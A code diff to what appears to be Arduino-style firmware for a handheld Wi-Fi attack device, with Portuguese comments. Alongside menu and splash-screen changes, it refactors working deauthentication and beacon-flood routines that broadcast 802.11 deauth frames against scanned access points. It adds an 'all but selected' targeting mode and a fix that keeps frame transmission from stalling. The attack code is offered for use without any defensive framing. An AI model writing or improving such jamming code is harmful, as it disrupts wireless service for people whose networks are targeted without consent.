@@ -12,6 +12,7 @@
 #include <SPI.h>
 #define SPI_MODE0 0x00
 #include "debug.h"
+#include <algorithm>
 #include <map>
 #include <vector>
 #include <Wire.h>
@@ -39,96 +40,6 @@ typedef struct {
   bool isSelected;
 } WiFiScanResult;
 
-#define LOGO_WIDTH 128
-#define LOGO_HEIGHT 64
-
-const unsigned char epd_bitmap_Sem_T_tulo_1[] PROGMEM = {
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xf0, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff,
-    0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x01, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xff, 0xe0, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff,
-    0xff, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x0f, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xfe, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xff,
-    0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x1f, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xff, 0xff, 0xc0, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xff,
-    0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xc3, 0xff, 0xff, 0xff, 0xe0, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xc1, 0xff,
-    0xff, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x01, 0x81, 0xf8, 0xff, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x81, 0xf8, 0x3f, 0xff, 0xe0, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0xf0,
-    0x1f, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x01, 0x81, 0xf0, 0x0f, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x03, 0xf0, 0x07, 0xff, 0xe0, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x0f, 0xf0,
-    0x07, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x06, 0x1f, 0xf0, 0x07, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x7e, 0x70, 0x07, 0xff, 0xe0, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xfc, 0x70,
-    0x07, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x03, 0xf8, 0x70, 0x07, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xf0, 0x70, 0x07, 0xff, 0xc0, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xe0, 0x78,
-    0x07, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x01, 0xe0, 0x78, 0x0f, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xe0, 0x7e, 0x3f, 0xff, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xfc, 0x7f,
-    0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x01, 0xfc, 0x7f, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0xfe, 0xf8, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xff,
-    0xb8, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x7f, 0xff, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0x18, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff,
-    0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x39, 0xf3, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0xe3, 0x18, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0xe0,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x20, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x60, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe0,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00};
 
 unsigned long prevTimeMon = 0;
 uint32_t pktsMon = 0;
@@ -185,6 +96,11 @@ int scanNetworks() {
   scan_results.clear();
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
     delay(5000);
+    // Ordena por sinal: redes mais fortes primeiro (RSSI em dBm, maior = melhor)
+    std::sort(scan_results.begin(), scan_results.end(),
+              [](const WiFiScanResult &a, const WiFiScanResult &b) {
+                return a.rssi > b.rssi;
+              });
     DEBUG_SER_PRINT(" Done!\n");
     return 0;
   } else {
@@ -197,6 +113,20 @@ int scanNetworks() {
 void drawFrame() {
   display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
   display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);
+}
+
+// Desenha uma caveira centrada em (cx, cy) usando primitivas do GFX.
+// Fácil de reposicionar e sem custo de memória de um bitmap.
+void drawSkull(int cx, int cy) {
+  display.fillRoundRect(cx - 20, cy - 24, 40, 36, 12, WHITE); // crânio
+  display.fillRoundRect(cx - 12, cy + 8, 24, 14, 4, WHITE);   // maxilar
+  display.fillCircle(cx - 10, cy - 6, 7, BLACK);              // olho esq.
+  display.fillCircle(cx + 10, cy - 6, 7, BLACK);              // olho dir.
+  display.fillTriangle(cx, cy + 1, cx - 4, cy + 8, cx + 4, cy + 8,
+                       BLACK); // nariz
+  display.drawFastHLine(cx - 12, cy + 8, 24, BLACK); // linha da gengiva
+  for (int i = -8; i <= 8; i += 4)
+    display.drawFastVLine(cx + i, cy + 8, 14, BLACK); // dentes
 }
 
 void drawMenuItem(int y, const char *text, bool selected) {
@@ -222,16 +152,6 @@ void drawMessageScreen(const char *line1, const char *line2) {
   display.display();
 }
 
-void drawAttackScreenHeader() {
-  display.clearDisplay();
-  drawFrame();
-  display.setTextColor(WHITE);
-  display.setTextSize(2);
-  display.setCursor(28, 8);
-  display.println("ATTACK");
-  display.setTextSize(1);
-}
-
 void drawMainMenu(int selectedIndex) {
   display.clearDisplay();
   drawFrame();
@@ -240,6 +160,35 @@ void drawMainMenu(int selectedIndex) {
     drawMenuItem(8 + (i * 13), menuItems[i], i == selectedIndex);
   }
   display.display();
+}
+
+// Conta quantas redes estão marcadas.
+int countSelected() {
+  int k = 0;
+  for (size_t i = 0; i < scan_results.size(); i++)
+    if (scan_results[i].isSelected)
+      k++;
+  return k;
+}
+
+// Linhas navegáveis da tela de seleção: N redes + Select All / Clear All / Back.
+int multiSelectRowCount() { return (int)scan_results.size() + 3; }
+
+// Monta o rótulo da linha 'index' (rede com RSSI/canal, ou uma das ações).
+void multiSelectLabel(int index, char *buf, size_t bufLen) {
+  int n = (int)scan_results.size();
+  if (index < n) {
+    const char *prefix = scan_results[index].isSelected ? "[x] " : "[ ] ";
+    snprintf(buf, bufLen, "%s%-9.9s%4d/%u", prefix,
+             scan_results[index].ssid.c_str(), scan_results[index].rssi,
+             scan_results[index].channel);
+  } else if (index == n) {
+    snprintf(buf, bufLen, "   Select All");
+  } else if (index == n + 1) {
+    snprintf(buf, bufLen, "   Clear All");
+  } else {
+    snprintf(buf, bufLen, "<- Back (%d sel)", countSelected());
+  }
 }
 
 void drawMultiSelectScreen(int scrollIndex) {
@@ -256,46 +205,27 @@ void drawMultiSelectScreen(int scrollIndex) {
   }
 
   int itemsPerPage = 4;
+  int total = multiSelectRowCount();
   int start = (scrollIndex / itemsPerPage) * itemsPerPage;
-  int itemsDrawnOnPage = 0;
 
   for (int i = 0; i < itemsPerPage; i++) {
     int currentIndex = start + i;
-    if ((size_t)currentIndex < scan_results.size()) {
-      bool isHighlighted = (currentIndex == scrollIndex);
-      char lineBuffer[30];
-      const char *prefix =
-          scan_results[currentIndex].isSelected ? "[x] " : "[ ] ";
-      snprintf(lineBuffer, sizeof(lineBuffer), "%s%s", prefix,
-               scan_results[currentIndex].ssid.c_str());
+    if (currentIndex >= total)
+      break;
 
-      int yPos = 8 + (i * 13);
+    char lineBuffer[32];
+    multiSelectLabel(currentIndex, lineBuffer, sizeof(lineBuffer));
 
-      if (isHighlighted) {
-        display.fillRect(4, yPos - 3, SCREEN_WIDTH - 8, 11, WHITE);
-        display.setTextColor(BLACK);
-      } else {
-        display.setTextColor(WHITE);
-      }
-      display.setCursor(8, yPos);
-      display.print(lineBuffer);
-      display.setTextColor(WHITE);
-      itemsDrawnOnPage++;
-    }
-  }
-
-  bool backSelected = ((size_t)scrollIndex == scan_results.size());
-  int backButtonYPos = 8 + (itemsDrawnOnPage * 13);
-
-  if (backButtonYPos < SCREEN_HEIGHT - 4) {
-    if (backSelected) {
-      display.fillRect(4, backButtonYPos - 3, SCREEN_WIDTH - 8, 11, WHITE);
+    int yPos = 8 + (i * 13);
+    if (currentIndex == scrollIndex) {
+      display.fillRect(4, yPos - 3, SCREEN_WIDTH - 8, 11, WHITE);
       display.setTextColor(BLACK);
     } else {
       display.setTextColor(WHITE);
     }
-    display.setCursor(8, backButtonYPos);
-    display.print("<- Back");
+    display.setCursor(8, yPos);
+    display.print(lineBuffer);
+    display.setTextColor(WHITE);
   }
 
   display.display();
@@ -325,69 +255,88 @@ void drawScanScreen() {
 }
 
 // FUNÇÕES DE ATAQUE
-void SelectedAttack() {
-  drawAttackScreenHeader();
-  display.setCursor(10, 35);
-  display.println("Selected Targets...");
-  display.display();
+enum DeauthMode { ATK_SELECTED, ATK_ALL, ATK_ALL_BUT_SELECTED };
 
-  uint8_t deauth_bssid[6];
-  while (true) {
-    if (digitalRead(BTN_OK) == LOW) {
-      delay(100);
-      break;
-    }
-    for (size_t i = 0; i < scan_results.size(); i++) {
-      if (scan_results[i].isSelected) {
-        memcpy(deauth_bssid, scan_results[i].bssid, 6);
-        wext_set_channel(WLAN0_NAME, scan_results[i].channel);
-        for (int x = 0; x < perdeauth; x++) {
-          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
-                               1);
-          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
-                               4);
-          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
-                               16);
-        }
-      }
-    }
-  }
+// Tela de ataque em andamento, redesenhada ao vivo.
+// 'fail' conta frames recusados pelo driver (pool de TX esgotado): se esse
+// número dispara, o envio "travou" mesmo com o laço ainda rodando.
+void drawAttackRun(const char *title, uint32_t sent, uint32_t fail,
+                   int channel) {
+  display.clearDisplay();
+  drawFrame();
+  display.setTextColor(WHITE);
+  display.setTextSize(2);
+  display.setCursor(28, 6);
+  display.println("ATTACK");
+  display.setTextSize(1);
+  display.setCursor(8, 26);
+  display.print(title);
+  display.setCursor(8, 38);
+  display.print("TX:");
+  display.print(sent);
+  display.setCursor(8, 48);
+  display.print("Fail:");
+  display.print(fail);
+  display.print(" Ch:");
+  display.print(channel);
+  display.display();
 }
 
-void All() {
-  drawAttackScreenHeader();
-  display.setCursor(10, 35);
-  display.println("All Networks...");
-  display.display();
-
+// Deauth unificado: marcadas (ATK_SELECTED), todas (ATK_ALL) ou todas menos
+// as marcadas (ATK_ALL_BUT_SELECTED). O delay(1) por alvo dá folga ao driver
+// para drenar a fila de TX, evitando o travamento silencioso do envio.
+void runDeauthAttack(DeauthMode mode, const char *title) {
   uint8_t deauth_bssid[6];
+  const uint16_t reasons[] = {1, 4, 16};
+  uint32_t sent = 0, fail = 0;
+  int lastChannel = current_channel;
+  unsigned long lastUi = 0;
+
+  drawAttackRun(title, 0, 0, lastChannel);
+
   while (true) {
     if (digitalRead(BTN_OK) == LOW) {
       delay(100);
       break;
     }
     for (size_t i = 0; i < scan_results.size(); i++) {
+      if (mode == ATK_SELECTED && !scan_results[i].isSelected)
+        continue;
+      if (mode == ATK_ALL_BUT_SELECTED && scan_results[i].isSelected)
+        continue;
+
       memcpy(deauth_bssid, scan_results[i].bssid, 6);
-      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
+      lastChannel = scan_results[i].channel;
+      wext_set_channel(WLAN0_NAME, lastChannel);
+
       for (int x = 0; x < perdeauth; x++) {
-        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
-                             1);
-        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
-                             4);
-        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
-                             16);
+        for (int r = 0; r < 3; r++) {
+          if (wifi_tx_deauth_frame(
+                  deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reasons[r]))
+            sent++;
+          else
+            fail++;
+        }
       }
+      delay(1); // yield: deixa o driver esvaziar a fila de TX
+    }
+
+    unsigned long now = millis();
+    if (now - lastUi > 250) {
+      lastUi = now;
+      drawAttackRun(title, sent, fail, lastChannel);
     }
   }
 }
 
 void BeaconDeauth() {
-  drawAttackScreenHeader();
-  display.setCursor(10, 35);
-  display.println("Beacon + Deauth...");
-  display.display();
-
   uint8_t deauth_bssid[6], becaon_bssid[6];
+  uint32_t sent = 0, fail = 0;
+  int lastChannel = current_channel;
+  unsigned long lastUi = 0;
+
+  drawAttackRun("Beacon+Deauth", 0, 0, lastChannel);
+
   while (true) {
     if (digitalRead(BTN_OK) == LOW) {
       delay(100);
@@ -397,24 +346,39 @@ void BeaconDeauth() {
       const char *ssid1_cstr = scan_results[i].ssid.c_str();
       memcpy(becaon_bssid, scan_results[i].bssid, 6);
       memcpy(deauth_bssid, scan_results[i].bssid, 6);
-      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
+      lastChannel = scan_results[i].channel;
+      wext_set_channel(WLAN0_NAME, lastChannel);
       for (int x = 0; x < 10; x++) {
-        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
-                             ssid1_cstr);
-        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
-                             0);
+        if (wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
+                                 ssid1_cstr))
+          sent++;
+        else
+          fail++;
+        if (wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
+                                 0))
+          sent++;
+        else
+          fail++;
       }
+      delay(1); // yield: deixa o driver esvaziar a fila de TX
+    }
+
+    unsigned long now = millis();
+    if (now - lastUi > 250) {
+      lastUi = now;
+      drawAttackRun("Beacon+Deauth", sent, fail, lastChannel);
     }
   }
 }
 
 void Beacon() {
-  drawAttackScreenHeader();
-  display.setCursor(10, 35);
-  display.println("Beacon Flood...");
-  display.display();
-
   uint8_t becaon_bssid[6];
+  uint32_t sent = 0, fail = 0;
+  int lastChannel = current_channel;
+  unsigned long lastUi = 0;
+
+  drawAttackRun("Beacon Flood", 0, 0, lastChannel);
+
   while (true) {
     if (digitalRead(BTN_OK) == LOW) {
       delay(100);
@@ -423,11 +387,22 @@ void Beacon() {
     for (size_t i = 0; i < scan_results.size(); i++) {
       const char *ssid1_cstr = scan_results[i].ssid.c_str();
       memcpy(becaon_bssid, scan_results[i].bssid, 6);
-      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
+      lastChannel = scan_results[i].channel;
+      wext_set_channel(WLAN0_NAME, lastChannel);
       for (int x = 0; x < 10; x++) {
-        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
-                             ssid1_cstr);
+        if (wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
+                                 ssid1_cstr))
+          sent++;
+        else
+          fail++;
       }
+      delay(1); // yield: deixa o driver esvaziar a fila de TX
+    }
+
+    unsigned long now = millis();
+    if (now - lastUi > 250) {
+      lastUi = now;
+      drawAttackRun("Beacon Flood", sent, fail, lastChannel);
     }
   }
 }
@@ -441,28 +416,34 @@ void attackLoop() {
   while (running) {
     display.clearDisplay();
     drawFrame();
-    const char *attackTypes[] = {"Selected Deauth", "All Deauth", "Beacon",
-                                 "Beacon+Deauth", "Back"};
-    for (int i = 0; i < 5; i++) {
-      drawMenuItem(8 + (i * 11), attackTypes[i], i == attackState);
+    const char *attackTypes[] = {"Selected Deauth", "All Deauth",
+                                 "All but Sel.",    "Beacon",
+                                 "Beacon+Deauth",   "Back"};
+    const int itemCount = 6;
+    const int backIndex = itemCount - 1;
+    for (int i = 0; i < itemCount; i++) {
+      drawMenuItem(6 + (i * 9), attackTypes[i], i == attackState);
     }
     display.display();
     if (digitalRead(BTN_OK) == LOW) {
       delay(DEBOUNCE_DELAY);
-      if (attackState == 4) {
+      if (attackState == backIndex) {
         running = false;
       } else {
         switch (attackState) {
         case 0:
-          SelectedAttack();
+          runDeauthAttack(ATK_SELECTED, "Selected");
           break;
         case 1:
-          All();
+          runDeauthAttack(ATK_ALL, "All Networks");
           break;
         case 2:
-          Beacon();
+          runDeauthAttack(ATK_ALL_BUT_SELECTED, "All but Sel.");
           break;
         case 3:
+          Beacon();
+          break;
+        case 4:
           BeaconDeauth();
           break;
         }
@@ -470,7 +451,7 @@ void attackLoop() {
     }
     if (digitalRead(BTN_UP) == LOW) {
       delay(DEBOUNCE_DELAY);
-      if (attackState < 4)
+      if (attackState < backIndex)
         attackState++;
     }
     if (digitalRead(BTN_DOWN) == LOW) {
@@ -489,13 +470,22 @@ void networkMultiSelectionLoop() {
   }
   while (running) {
     drawMultiSelectScreen(scrollindex);
+    int n = (int)scan_results.size();
     if (digitalRead(BTN_OK) == LOW) {
       delay(DEBOUNCE_DELAY);
-      if ((size_t)scrollindex == scan_results.size() || scan_results.empty()) {
+      if (scan_results.empty()) {
         running = false;
-      } else {
+      } else if (scrollindex < n) {
         scan_results[scrollindex].isSelected =
             !scan_results[scrollindex].isSelected;
+      } else if (scrollindex == n) { // Select All
+        for (int i = 0; i < n; i++)
+          scan_results[i].isSelected = true;
+      } else if (scrollindex == n + 1) { // Clear All
+        for (int i = 0; i < n; i++)
+          scan_results[i].isSelected = false;
+      } else { // Back
+        running = false;
       }
       while (digitalRead(BTN_OK) == LOW) {
         delay(10);
@@ -503,7 +493,7 @@ void networkMultiSelectionLoop() {
     }
     if (digitalRead(BTN_UP) == LOW) {
       delay(DEBOUNCE_DELAY);
-      if ((size_t)scrollindex < scan_results.size())
+      if (scrollindex < multiSelectRowCount() - 1)
         scrollindex++;
     }
     if (digitalRead(BTN_DOWN) == LOW) {
@@ -619,10 +609,9 @@ void setup() {
       ;
   }
 
-  // Limpa a tela e desenha a nova splash screen
+  // Limpa a tela e desenha a splash screen (caveira centralizada)
   display.clearDisplay();
-  display.drawBitmap(0, 0, epd_bitmap_Sem_T_tulo_1, LOGO_WIDTH, LOGO_HEIGHT,
-                     WHITE);
+  drawSkull(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2);
   display.display();
   delay(3000);
   display.clearDisplay();
